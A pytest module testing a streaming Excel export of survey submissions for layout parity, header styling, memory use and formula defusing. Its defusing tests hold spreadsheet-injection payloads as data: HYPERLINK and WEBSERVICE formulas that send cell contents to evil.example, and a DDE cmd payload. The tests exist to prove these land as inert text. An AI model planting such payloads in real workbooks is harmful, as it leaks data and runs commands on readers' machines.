"""Streaming (write_only) combined-workbook export — services/export_service.

``build_test_combined_workbook`` used to hold every cell of up to 303 sheets in
memory until save(). It now streams each sheet to disk as it is built, which
means the two post-processing passes it relied on (header styling and formula
defusing) can no longer reach a written cell and had to move to write time.

Those two are exactly what this module pins down:

* **content parity** — a LEGACY oracle (the pre-change implementation, copied
  verbatim below and built on a plain in-memory Workbook) is run on the same
  fabricated corpus and compared sheet-by-sheet, cell-by-cell;
* **styling** — header font/fill/alignment, frozen panes and column widths;
* **defusing** — no user-controlled string can reach the .xlsx as a live
  formula, checked both through the object model and in the raw sheet XML;
* **memory** — the streaming builder's tracemalloc peak against the oracle's.

No DB and no server: the model layer is monkeypatched.
"""
import gc
import json
import os
import tracemalloc
import zipfile
from io import BytesIO

import openpyxl
import pytest
from openpyxl.styles import Font
from openpyxl.worksheet._write_only import WriteOnlyWorksheet

from services import export_service as ex


# ---------------------------------------------------------------------------
# LEGACY oracle — the implementation as it was before streaming.
# ---------------------------------------------------------------------------
# Kept verbatim (only renamed) so the parity assertions below compare against
# real previous behaviour rather than against a paraphrase of it. Only the
# assembly changed; the row/header builders (_summary_row, _summary_headers,
# _processed_row) are shared pure functions and are reused as-is.

def _legacy_style_header_row(ws, headers):
    for cell in ws[1]:
        cell.font = ex._HEADER_FONT
        cell.fill = ex._HEADER_FILL
        cell.alignment = ex._HEADER_ALIGN
    for row in ws.iter_rows(min_row=2, max_row=ws.max_row):
        for cell in row:
            cell.alignment = ex._CELL_ALIGN
    for col_idx, header_val in enumerate(headers, 1):
        letter = openpyxl.utils.get_column_letter(col_idx)
        if header_val in ex._FIXED_COLS:
            ws.column_dimensions[letter].width = ex._FIXED_COLS[header_val]
        elif header_val.endswith(" %"):
            ws.column_dimensions[letter].width = 12
        else:
            ws.column_dimensions[letter].width = 18
    ws.freeze_panes = "A2"


def _legacy_fill_summary_sheet(ws, subs, block_titles, qkeys, qlabels):
    headers = ex._summary_headers(block_titles, qlabels, qkeys)
    ws.append(headers)
    for s in subs:
        ws.append(ex._summary_row(s, block_titles, qkeys))
    _legacy_style_header_row(ws, headers)


def _legacy_fill_processed_sheet(ws, subs):
    ws.append(ex._PROCESSED_HEADERS)
    for s in subs:
        ws.append(ex._processed_row(s))
    _legacy_style_header_row(ws, ex._PROCESSED_HEADERS)


def _legacy_fill_single_user_sheet(ws, sub, qkeys, qlabels):
    ws.append(["BizCheck — Індивідуальний звіт"])
    ws.cell(row=1, column=1).font = Font(bold=True, size=14)
    ws.append([])

    name = f"{sub.get('first_name') or ''} {sub.get('last_name') or ''}".strip() or "—"
    pairs = [
        ("Повне ім'я", name),
        ("Email", sub.get("email") or "—"),
        ("Телефон", sub.get("phone") or "—"),
        ("Сектор", sub.get("sector") or "—"),
        ("Розмір компанії", sub.get("company_size") or "—"),
        ("Вік компанії", sub.get("company_age") or "—"),
        ("Оборот", sub.get("company_revenue") or "—"),
        ("Мова", sub.get("language") or "—"),
        ("Обраний канал доставки", ex._infer_delivery(sub)),
        ("Telegram @username", sub.get("tg_username") or "—"),
        ("Telegram відображуване ім'я",
         f"{sub.get('tg_first_name') or ''} {sub.get('tg_last_name') or ''}".strip() or "—"),
        ("Статус", sub.get("status") or "—"),
        ("Дата заповнення", str(sub.get("created_at") or "—")),
        # Percentage FORMATTING is shared with the live implementation on
        # purpose (ex._display_pct_cell / ex._fmt_score): this oracle pins the
        # streaming vs in-memory ASSEMBLY, not the display rule, and duplicating
        # the rule here would only make it drift.
        ("Загальний бал %", ex._display_pct_cell(sub.get("total_score", "—"))),
    ]
    for k, v in pairs:
        ws.append([k, v])
        ws.cell(row=ws.max_row, column=1).font = Font(bold=True)

    ws.append([])
    ws.append(["Бали за блоками"])
    ws.cell(row=ws.max_row, column=1).font = Font(bold=True, size=12)

    bs = ex._parse_json_field(sub.get("block_scores_json")) or []
    if isinstance(bs, list):
        for b in bs:
            ws.append([b.get("title", "—"), ex._fmt_score(b.get("score"))])

    ws.append([])
    ws.append(["Детальні відповіді за питаннями"])
    ws.cell(row=ws.max_row, column=1).font = Font(bold=True, size=12)
    ws.append(["Питання", "Бал"])
    for c in ws[ws.max_row]:
        c.font = ex._HEADER_FONT
        c.fill = ex._HEADER_FILL

    answers = ex._parse_json_field(sub.get("answers_json")) or {}
    if not isinstance(answers, dict):
        answers = {}
    for qkey in qkeys:
        ws.append([qlabels.get(qkey, qkey), answers.get(qkey, "")])

    for row in ws.iter_rows():
        for cell in row:
            cell.alignment = ex._CELL_ALIGN
    ws.column_dimensions['A'].width = 46
    ws.column_dimensions['B'].width = 56


def legacy_build_test_combined_workbook(test_id):
    """Pre-change ``build_test_combined_workbook`` (no date filter needed here)."""
    subs = ex._filter_submissions_for_test(test_id)
    blocks = ex._get_test_blocks(test_id)
    qkeys, qlabels = ex._collect_questions_for_blocks(blocks)
    block_titles = ex._block_titles_from_subs(subs)

    completed = [s for s in subs if (s.get("status") or "") == "completed"]
    in_progress = [s for s in subs if (s.get("status") or "") != "completed"]

    wb = openpyxl.Workbook()
    summary = wb.active
    summary.title = "Зведення"
    _legacy_fill_summary_sheet(summary, subs, block_titles, qkeys, qlabels)

    finished_ws = wb.create_sheet(title="Завершені")
    _legacy_fill_summary_sheet(finished_ws, completed, block_titles, qkeys, qlabels)

    in_progress_ws = wb.create_sheet(title="У процесі")
    _legacy_fill_processed_sheet(in_progress_ws, in_progress)

    used_names = {"Зведення", "Завершені", "У процесі"}
    for s in completed[:ex.MAX_USER_SHEETS]:
        raw = f"{s['id']}_{s.get('first_name') or ''}_{s.get('last_name') or ''}"
        base = ex._safe_sheet_name(raw)
        name, i = base, 1
        while name in used_names:
            suffix = f"_{i}"
            name = base[: 31 - len(suffix)] + suffix
            i += 1
        used_names.add(name)
        ws = wb.create_sheet(title=name)
        _legacy_fill_single_user_sheet(ws, s, qkeys, qlabels)
    return wb


# ---------------------------------------------------------------------------
# Fabricated corpus
# ---------------------------------------------------------------------------
_N_BLOCKS = 4
_N_Q = 5


def _corpus(n, *, sector_of=None):
    blocks = [{"id": b} for b in range(1, _N_BLOCKS + 1)]
    questions = [
        {"id": b * 100 + q, "block_id": b, "parent_question_id": None,
         "text_uk": f"Питання {b}.{q} — текст трохи довший за сорок символів"}
        for b in range(1, _N_BLOCKS + 1) for q in range(1, _N_Q + 1)
    ]
    subs = []
    for i in range(1, n + 1):
        answers = {f"b{b}q{b * 100 + q}": (i + b + q) % 4
                   for b in range(1, _N_BLOCKS + 1) for q in range(1, _N_Q + 1)}
        subs.append({
            "id": i,
            "first_name": f"Ім'я{i}", "last_name": f"Прізвище{i}",
            "email": f"user{i}@example.com", "phone": f"+3806000{i:05d}",
            "sector": sector_of(i) if sector_of else "IT / Цифрові сервіси",
            "company_size": "10-49", "company_age": "3-5", "company_revenue": "1-5M",
            "status": "completed" if i % 5 else "in_progress",
            "created_at": f"2026-01-{(i % 28) + 1:02d} 10:00:00",
            "language": "uk", "consent": bool(i % 2), "test_id": 1,
            "tg_username": f"@user{i}", "tg_first_name": "TG", "tg_last_name": "Name",
            "tg_chat_id": 1000 + i, "total_score": (i * 7) % 100,
            "block_scores_json": json.dumps(
                [{"id": b, "title": f"Блок {b} — назва", "score": (i + b) % 100}
                 for b in range(1, _N_BLOCKS + 1)]),
            "answers_json": json.dumps(answers),
        })
    return blocks, questions, subs


def _patch(monkeypatch, blocks, questions, subs):
    monkeypatch.setattr("models.submission.Submission.find_all",
                        staticmethod(lambda test_id=None: subs))
    monkeypatch.setattr("models.block.Block.find_by_test", staticmethod(lambda t: blocks))
    monkeypatch.setattr("models.block.Block.find_all", staticmethod(lambda: blocks))
    monkeypatch.setattr("models.question.Question.find_by_blocks",
                        staticmethod(lambda ids: questions))


def _values(wb_bytes):
    """{sheet: [[cell values]]} with trailing empty cells trimmed."""
    book = openpyxl.load_workbook(BytesIO(wb_bytes))
    out = {}
    for ws in book.worksheets:
        rows = []
        for row in ws.iter_rows():
            vals = [c.value for c in row]
            while vals and vals[-1] is None:
                vals.pop()
            rows.append(vals)
        while rows and not rows[-1]:
            rows.pop()
        out[ws.title] = rows
    return book, out


@pytest.fixture
def corpus(monkeypatch):
    blocks, questions, subs = _corpus(12)
    _patch(monkeypatch, blocks, questions, subs)
    return subs


# ---------------------------------------------------------------------------
# 1. Content parity against the legacy oracle
# ---------------------------------------------------------------------------
class TestParityWithLegacyImplementation:

    def test_same_sheets_same_order_same_values(self, corpus):
        old_book, old = _values(ex.workbook_to_bytes(legacy_build_test_combined_workbook(1)))
        new_book, new = _values(ex.workbook_to_bytes(ex.build_test_combined_workbook(1)))

        assert new_book.sheetnames == old_book.sheetnames
        assert len(new_book.sheetnames) == 3 + sum(
            1 for s in corpus if s["status"] == "completed")
        for name in old_book.sheetnames:
            assert new[name] == old[name], f"cell values drifted on sheet {name!r}"

    def test_same_column_widths_and_frozen_panes(self, corpus):
        old_book, _ = _values(ex.workbook_to_bytes(legacy_build_test_combined_workbook(1)))
        new_book, _ = _values(ex.workbook_to_bytes(ex.build_test_combined_workbook(1)))
        for name in old_book.sheetnames:
            o, n = old_book[name], new_book[name]
            assert ({k: v.width for k, v in n.column_dimensions.items()}
                    == {k: v.width for k, v in o.column_dimensions.items()}), name
            assert n.freeze_panes == o.freeze_panes, name

    def test_same_styling_on_every_non_empty_cell(self, corpus):
        """Font / fill / alignment must survive the move to write time.

        Empty cells are excluded on purpose: the legacy pass walked
        ``ws.iter_rows()``, which MATERIALIZES a cell at every coordinate of the
        bounding box, so blank padding cells picked up an alignment. Streaming
        never creates them. Invisible either way — an empty cell with wrap_text
        renders exactly like an empty cell without it.
        """
        def styles(book):
            out = {}
            for ws in book.worksheets:
                for row in ws.iter_rows():
                    for c in row:
                        if c.value is None:
                            continue
                        out[(ws.title, c.coordinate)] = (
                            c.value, c.font.b, c.font.sz,
                            c.fill.start_color.rgb if c.fill.fill_type else None,
                            (c.alignment.wrapText, c.alignment.vertical,
                             c.alignment.horizontal),
                        )
            return out

        old_book, _ = _values(ex.workbook_to_bytes(legacy_build_test_combined_workbook(1)))
        new_book, _ = _values(ex.workbook_to_bytes(ex.build_test_combined_workbook(1)))
        assert styles(new_book) == styles(old_book)

    def test_all_submissions_workbook_matches_too(self, corpus):
        """The global export shares the summary fills, so it streams as well."""
        wb = ex.build_all_submissions_workbook()
        book, vals = _values(ex.workbook_to_bytes(wb))
        assert book.sheetnames == ["Зведення", "Завершені", "У процесі"]
        assert len(vals["Зведення"]) == len(corpus) + 1          # header + rows
        assert len(vals["Завершені"]) == 1 + sum(
            1 for s in corpus if s["status"] == "completed")


# ---------------------------------------------------------------------------
# 2. Header styling survives streaming
# ---------------------------------------------------------------------------
class TestHeaderStyling:

    def test_header_row_is_bold_filled_centered_and_frozen(self, corpus):
        book, _ = _values(ex.workbook_to_bytes(ex.build_test_combined_workbook(1)))
        for name in ("Зведення", "Завершені", "У процесі"):
            ws = book[name]
            assert ws.freeze_panes == "A2", name
            for cell in ws[1]:
                assert cell.font.b is True, f"{name}!{cell.coordinate} not bold"
                assert cell.fill.start_color.rgb.endswith("D9E1F2"), name
                assert cell.alignment.horizontal == "center", name
                assert cell.alignment.wrap_text is True, name

    def test_fixed_column_widths_are_applied(self, corpus):
        book, _ = _values(ex.workbook_to_bytes(ex.build_test_combined_workbook(1)))
        ws = book["Зведення"]
        assert ws.column_dimensions["A"].width == ex._FIXED_COLS["ID"]
        assert ws.column_dimensions["D"].width == ex._FIXED_COLS["Email"]

    def test_data_rows_keep_the_wrap_alignment(self, corpus):
        book, _ = _values(ex.workbook_to_bytes(ex.build_test_combined_workbook(1)))
        cell = book["Зведення"].cell(row=2, column=2)
        assert cell.alignment.wrap_text is True
        assert cell.alignment.vertical == "top"

    def test_user_sheet_keeps_its_bold_labels_and_widths(self, corpus):
        book, vals = _values(ex.workbook_to_bytes(ex.build_test_combined_workbook(1)))
        ws = book[book.sheetnames[3]]
        assert ws.cell(row=1, column=1).font.sz == 14
        assert ws.cell(row=1, column=1).font.b is True
        assert ws.cell(row=3, column=1).font.b is True     # "Повне ім'я" label
        assert ws.cell(row=3, column=2).font.b in (False, None)
        assert ws.column_dimensions["A"].width == 46
        assert ws.column_dimensions["B"].width == 56


# ---------------------------------------------------------------------------
# 3. Formula defusing survives streaming (CWE-1236)
# ---------------------------------------------------------------------------
# `sector` / `company_size` / `company_age` / `company_revenue` come straight
# from the PUBLIC PATCH /submissions/{id}; block titles and question labels ride
# in on the same write paths. openpyxl types a string starting with "=" as a
# FORMULA, so without defusing the admin downloads live code.

_LIVE_PAYLOADS = [
    '=HYPERLINK("http://evil.example/?"&A1,"Click me")',
    '=WEBSERVICE("http://evil.example/"&A1)',
    "=cmd|'/c calc'!A0",
    "=1+1",
]
# Excel's other CSV-injection lead characters. openpyxl never types these as
# formulas in an .xlsx — they must survive as verbatim text, unmodified.
_TEXT_PAYLOADS = ["+1+1", "-1-1", "@SUM(A1)", "=", "\t=1+1"]

_ALL_PAYLOADS = _LIVE_PAYLOADS + _TEXT_PAYLOADS


class TestFormulaDefusingInStreamingSheets:

    @pytest.fixture
    def poisoned(self, monkeypatch):
        """Every user-controlled string field carries a payload."""
        blocks, questions, subs = _corpus(len(_ALL_PAYLOADS))
        for i, sub in enumerate(subs):
            p = _ALL_PAYLOADS[i]
            sub["status"] = "completed" if i % 2 == 0 else "in_progress"
            sub["first_name"] = p
            sub["last_name"] = p
            sub["email"] = p
            sub["phone"] = p
            sub["sector"] = p
            sub["company_size"] = p
            sub["company_age"] = p
            sub["company_revenue"] = p
            sub["language"] = p
            sub["tg_username"] = p
            sub["block_scores_json"] = json.dumps([{"id": 1, "title": p, "score": 10}])
        for q in questions:
            q["text_uk"] = "=HYPERLINK(\"http://evil.example\",\"q\")"
        _patch(monkeypatch, blocks, questions, subs)
        return subs

    def test_no_formula_element_in_any_sheet_xml(self, poisoned):
        data = ex.workbook_to_bytes(ex.build_test_combined_workbook(1))
        zf = zipfile.ZipFile(BytesIO(data))
        sheets = [n for n in zf.namelist() if n.startswith("xl/worksheets/")]
        assert sheets
        for n in sheets:
            xml = zf.read(n).decode()
            assert "<f>" not in xml and "<f " not in xml, f"live formula in {n}"

    def test_every_equals_prefixed_cell_is_text_and_verbatim(self, poisoned):
        data = ex.workbook_to_bytes(ex.build_test_combined_workbook(1))
        book = openpyxl.load_workbook(BytesIO(data))
        seen = 0
        for ws in book.worksheets:
            for row in ws.iter_rows():
                for c in row:
                    if isinstance(c.value, str) and c.value.startswith("="):
                        seen += 1
                        assert c.data_type != "f", f"live formula at {ws.title}!{c.coordinate}"
        assert seen > 0, "the payloads never reached the workbook"

    @pytest.mark.parametrize("payload", _ALL_PAYLOADS)
    def test_each_payload_survives_verbatim(self, poisoned, payload):
        data = ex.workbook_to_bytes(ex.build_test_combined_workbook(1))
        book = openpyxl.load_workbook(BytesIO(data))
        found = False
        for ws in book.worksheets:
            for row in ws.iter_rows():
                for c in row:
                    if c.value == payload:
                        found = True
                        assert c.data_type == "s", (
                            f"{payload!r} typed as {c.data_type!r} at "
                            f"{ws.title}!{c.coordinate}")
        assert found, f"{payload!r} did not reach the workbook"

    def test_numbers_and_dates_keep_their_own_types(self, corpus):
        data = ex.workbook_to_bytes(ex.build_test_combined_workbook(1))
        book = openpyxl.load_workbook(BytesIO(data))
        ws = book["Зведення"]
        assert ws.cell(row=2, column=1).value == 1            # ID
        assert ws.cell(row=2, column=1).data_type == "n"
        assert ws.cell(row=2, column=18).data_type == "n"     # Загальний бал %

    def test_single_user_workbook_still_defuses(self, monkeypatch, corpus):
        """The in-memory builders keep the post-hoc pass — verify it still runs."""
        evil = dict(corpus[0])
        evil["sector"] = '=WEBSERVICE("http://evil.example")'
        monkeypatch.setattr("models.submission.Submission.find_by_id",
                            staticmethod(lambda i: evil))
        wb, _stem = ex.build_single_user_workbook(1)
        assert not isinstance(wb.worksheets[0], WriteOnlyWorksheet)
        xml = zipfile.ZipFile(BytesIO(ex.workbook_to_bytes(wb))).read(
            "xl/worksheets/sheet1.xml").decode()
        assert "<f>" not in xml and "<f " not in xml


class TestStreamSheetGuarantee:
    """The defusing must not depend on callers remembering to use _cell()."""

    # openpyxl's write-only row builder RECYCLES its cell object between
    # columns when the previous one carried no style, so a defused cell can be
    # handed the next column's value. These rows mix formulas with plain values
    # and Nones in every order that recycling could go wrong.
    _RAW_ROWS = [
        ['=HYPERLINK("http://evil.example","x")', 42, "plain"],
        ["=1+1", "=2+2", "=3+3"],
        ["=1+1", 42, "=3+3"],
        ["plain", '=WEBSERVICE("http://evil.example")', 7],
        ["=A1", None, "=B2"],
    ]

    def test_a_raw_append_of_a_formula_string_is_still_neutralized(self):
        wb = openpyxl.Workbook(write_only=True)
        ws = ex._stream_sheet(wb, "S")
        for row in self._RAW_ROWS:
            ws.append(row)
        ex._finish_sheet(ws)
        data = ex.workbook_to_bytes(wb)

        xml = zipfile.ZipFile(BytesIO(data)).read("xl/worksheets/sheet1.xml").decode()
        assert "<f>" not in xml and "<f " not in xml

        book = openpyxl.load_workbook(BytesIO(data))
        got = [[(c.value, c.data_type) for c in row] for row in book["S"].iter_rows()]
        assert got[0][:2] == [('=HYPERLINK("http://evil.example","x")', "s"), (42, "n")]
        assert got[1] == [("=1+1", "s"), ("=2+2", "s"), ("=3+3", "s")]
        assert got[2] == [("=1+1", "s"), (42, "n"), ("=3+3", "s")]
        assert got[3] == [("plain", "s"), ('=WEBSERVICE("http://evil.example")', "s"),
                          (7, "n")]
        assert [c[0] for c in got[4]] == ["=A1", None, "=B2"]   # None keeps its column

    def test_a_plain_write_only_sheet_is_rejected_not_silently_skipped(self):
        wb = openpyxl.Workbook(write_only=True)
        ws = wb.create_sheet("Raw")            # bypasses _stream_sheet
        ws.append(["=1+1"])
        try:
            with pytest.raises(RuntimeError, match="bypassed formula defusing"):
                ex.workbook_to_bytes(wb)
        finally:
            ex._discard_workbook(wb)

    def test_a_failed_build_leaves_no_temp_sheet_files_behind(self, monkeypatch):
        """Streaming parks rows in temp files that only save() removes."""
        from openpyxl.worksheet import _writer as opxl_writer

        blocks, questions, subs = _corpus(4)
        _patch(monkeypatch, blocks, questions, subs)
        boom = RuntimeError("DB went away mid-scan")
        monkeypatch.setattr(ex, "_fill_single_user_sheet",
                            lambda *a, **kw: (_ for _ in ()).throw(boom))

        before = set(opxl_writer.ALL_TEMP_FILES)
        with pytest.raises(RuntimeError, match="DB went away"):
            ex.build_test_combined_workbook(1)
        leaked = [p for p in set(opxl_writer.ALL_TEMP_FILES) - before
                  if os.path.exists(p)]
        assert leaked == []

    def test_stream_sheets_are_closed_as_they_are_built(self, corpus):
        """One open temp file at a time, not one per sheet (303 fds otherwise)."""
        wb = ex.build_test_combined_workbook(1)
        assert len(wb.worksheets) > 3
        assert all(ws.closed for ws in wb.worksheets)
        ex.workbook_to_bytes(wb)               # still saves fine afterwards


# ---------------------------------------------------------------------------
# 4. The point of the exercise: peak memory
# ---------------------------------------------------------------------------
class TestPeakMemory:

    @staticmethod
    def _peak(fn):
        gc.collect()
        tracemalloc.start()
        try:
            data = ex.workbook_to_bytes(fn())
            _cur, peak = tracemalloc.get_traced_memory()
        finally:
            tracemalloc.stop()
        gc.collect()
        return peak, len(data)

    def test_streaming_peak_is_a_fraction_of_the_in_memory_build(self, monkeypatch):
        blocks, questions, subs = _corpus(120)
        _patch(monkeypatch, blocks, questions, subs)

        old_peak, old_size = self._peak(lambda: legacy_build_test_combined_workbook(1))
        new_peak, new_size = self._peak(lambda: ex.build_test_combined_workbook(1))

        # Same output, radically less heap. Measured at 500 submissions:
        # 52.5 MB -> 6.2 MB peak for a ~1 MB file (see the module docstring).
        assert new_size == pytest.approx(old_size, rel=0.15)
        assert new_peak < old_peak * 0.5, (
            f"peak {new_peak / 1e6:.2f} MB vs legacy {old_peak / 1e6:.2f} MB")

    def test_peak_grows_far_slower_per_submission_than_before(self, monkeypatch):
        """The slope is what caused the OOM, so pin the slope, not one point.

        Streaming does not make the peak constant — the shared-strings table and
        the finished .xlsx bytes still scale with the corpus — but the per-
        submission cost drops by an order of magnitude (measured 0.100 MB/sub →
        0.010 MB/sub between 100 and 500 submissions).
        """
        def peaks(n):
            blocks, questions, subs = _corpus(n)
            _patch(monkeypatch, blocks, questions, subs)
            return (self._peak(lambda: legacy_build_test_combined_workbook(1))[0],
                    self._peak(lambda: ex.build_test_combined_workbook(1))[0])

        old_small, new_small = peaks(50)
        old_large, new_large = peaks(200)

        old_slope = (old_large - old_small) / 150
        new_slope = (new_large - new_small) / 150
        assert new_slope < old_slope / 4, (
            f"{new_slope:.0f} B/submission vs legacy {old_slope:.0f} B/submission")
